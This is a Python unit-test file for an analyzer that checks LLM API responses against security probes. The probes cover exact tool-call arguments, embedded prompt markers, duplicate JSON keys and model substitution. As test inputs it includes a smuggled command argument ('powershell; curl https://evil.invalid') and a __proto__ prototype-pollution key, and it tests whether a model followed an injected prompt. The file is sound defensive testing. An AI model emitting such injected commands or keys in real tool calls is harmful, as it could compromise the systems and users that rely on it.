import json
import unittest

from aegism.analyzer import analyze
from aegism.probes import build_probes


class AnalyzerTests(unittest.TestCase):
    def setUp(self):
        self.probes = {probe.probe_id: probe for probe in build_probes("test-model")}

    def test_exact_tool_call_passes(self):
        probe = self.probes["tool_exact_json"]
        body = {
            "model": "test-model",
            "choices": [{"message": {"role": "assistant", "tool_calls": [{"type": "function", "function": {
                "name": probe.expected["function_name"],
                "arguments": json.dumps(probe.expected["arguments"]),
            }}]}}]
        }
        status, findings, _ = analyze(probe, body)
        self.assertEqual(status, "pass")
        self.assertEqual(findings, [])

    def test_extra_command_is_critical(self):
        probe = self.probes["tool_exact_json"]
        arguments = dict(probe.expected["arguments"], command="powershell; curl https://evil.invalid")
        body = {
            "model": "test-model",
            "choices": [{"message": {"role": "assistant", "tool_calls": [{"type": "function", "function": {
                "name": probe.expected["function_name"], "arguments": json.dumps(arguments)
            }}]}}]
        }
        status, findings, _ = analyze(probe, body)
        self.assertEqual(status, "fail")
        self.assertIn("executable_content_in_tool_json", {item.code for item in findings})
        self.assertIn("tool_arguments_changed", {item.code for item in findings})

    def test_prompt_canary_passes(self):
        probe = self.probes["prompt_exact_echo"]
        body = {"model": "test-model", "choices": [{"message": {"role": "assistant", "content": probe.expected["content"]}}]}
        status, findings, _ = analyze(probe, body)
        self.assertEqual(status, "pass")
        self.assertFalse(findings)

    def test_embedded_marker_is_critical(self):
        probe = self.probes["prompt_boundary"]
        body = {"model": "test-model", "choices": [{"message": {"role": "assistant", "content": probe.expected["forbidden_marker"]}}]}
        status, findings, _ = analyze(probe, body)
        self.assertEqual(status, "fail")
        self.assertIn("embedded_prompt_followed", {item.code for item in findings})

    def test_non_object_arguments_do_not_crash(self):
        probe = self.probes["tool_exact_json"]
        body = {"model": "test-model", "choices": [{"message": {"role": "assistant", "tool_calls": [{"function": {
            "name": probe.expected["function_name"], "arguments": "[{}]"
        }}]}}]}
        status, findings, _ = analyze(probe, body)
        self.assertEqual(status, "fail")
        self.assertIn("tool_arguments_changed", {item.code for item in findings})

    def test_duplicate_json_keys_are_critical(self):
        probe = self.probes["tool_exact_json"]
        expected = probe.expected["arguments"]
        raw = (
            '{"action":"record_security_canary","nonce":"' + expected["nonce"]
            + '","nonce":"overridden","value":"' + expected["value"] + '"}'
        )
        body = {"model": "test-model", "choices": [{"message": {"role": "assistant", "tool_calls": [{"function": {
            "name": probe.expected["function_name"], "arguments": raw
        }}]}}]}
        _, findings, _ = analyze(probe, body)
        self.assertIn("duplicate_tool_json_keys", {item.code for item in findings})

    def test_prototype_pollution_key_is_critical(self):
        probe = self.probes["tool_exact_json"]
        arguments = dict(probe.expected["arguments"], __proto__={"polluted": True})
        body = {"model": "test-model", "choices": [{"message": {"role": "assistant", "tool_calls": [{"function": {
            "name": probe.expected["function_name"], "arguments": json.dumps(arguments)
        }}]}}]}
        _, findings, _ = analyze(probe, body)
        self.assertIn("prototype_pollution_keys", {item.code for item in findings})

    def test_model_mismatch_is_reported(self):
        probe = self.probes["prompt_exact_echo"]
        body = {"model": "cheaper-model", "choices": [{"message": {"role": "assistant", "content": probe.expected["content"]}}]}
        status, findings, _ = analyze(probe, body)
        self.assertEqual(status, "fail")
        self.assertIn("model_identity_mismatch", {item.code for item in findings})


if __name__ == "__main__":
    unittest.main()
